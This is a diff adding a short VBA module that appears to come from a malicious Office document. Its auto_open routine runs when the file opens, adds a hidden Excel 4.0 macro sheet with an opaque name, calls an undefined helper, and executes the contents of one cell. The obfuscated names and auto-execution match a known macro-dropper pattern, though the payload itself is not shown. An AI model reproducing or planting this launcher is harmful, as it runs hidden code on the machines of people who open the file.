@@ -1,0 +1,15 @@
+Attribute VB_Name = "Module6"
+
+
+
+
+
+
+Sub auto_open()
+Set Fera = Excel4IntlMacroSheets
+Fera.Add.Name = "Nneeri"
+Retio
+Application.Run Sheets("Nneeri").Range("H3")
+
+End Sub
+
